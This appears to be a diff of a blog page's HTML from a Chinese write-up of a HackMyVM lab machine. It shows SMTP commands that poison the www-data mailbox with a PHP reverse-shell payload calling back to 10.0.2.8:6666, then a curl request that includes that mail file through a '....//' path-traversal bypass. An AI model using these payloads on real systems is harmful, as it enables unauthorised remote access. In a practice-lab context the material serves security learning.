@@ -262,9 +262,9 @@
 <p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/2860184-20230726203520531-1765712000.png" alt="image-20230726203515657"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM: kali@nologin.com，设置发送人地址</span><br><span class="line">RCPT TO:  www-data@logan.hmv，设置收件人地址</span><br><span class="line">data</span><br><span class="line">&lt;?php exec(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.2.8/6666 0&gt;&amp;1&#x27;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>这两个意思是设置后发给服务器后会有个响应，并在其中设置数据发送给<a href="mailto:&#119;&#119;&#119;&#45;&#100;&#x61;&#116;&#97;&#64;&#x6c;&#x6f;&#x67;&#x61;&#x6e;&#x2e;&#x68;&#x6d;&#x76;">www-data@logan.hmv</a>，</p>
+<p>这两个意思是设置后发给服务器后会有个响应，并在其中设置数据发送给<a href="mailto:&#x77;&#119;&#x77;&#45;&#100;&#x61;&#116;&#97;&#64;&#108;&#x6f;&#103;&#97;&#110;&#46;&#x68;&#109;&#118;">www-data@logan.hmv</a>，</p>
 <p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/2860184-20230726204836073-1720300492.png" alt="image-20230726204829460"></p>
-<p>我们这个时候访问<a href="mailto:&#x77;&#x77;&#119;&#x2d;&#100;&#x61;&#x74;&#97;&#x40;&#x6c;&#x6f;&#x67;&#x61;&#x6e;&#x2e;&#x68;&#x6d;&#118;">www-data@logan.hmv</a>会访问其中的数据，从而实现反弹shell</p>
+<p>我们这个时候访问<a href="mailto:&#119;&#119;&#x77;&#x2d;&#100;&#x61;&#x74;&#97;&#64;&#x6c;&#x6f;&#103;&#97;&#110;&#x2e;&#x68;&#x6d;&#x76;">www-data@logan.hmv</a>会访问其中的数据，从而实现反弹shell</p>
 <p>这个时候在&#x2F;var&#x2F;mail&#x2F;www-data中就会有数据</p>
 <p>我们包含他就可以实现</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://admin.logan.hmv/payments.php -d &#x27;file=....//....//....//....//....//var/mail/www-data&#x27;</span><br></pre></td></tr></table></figure>
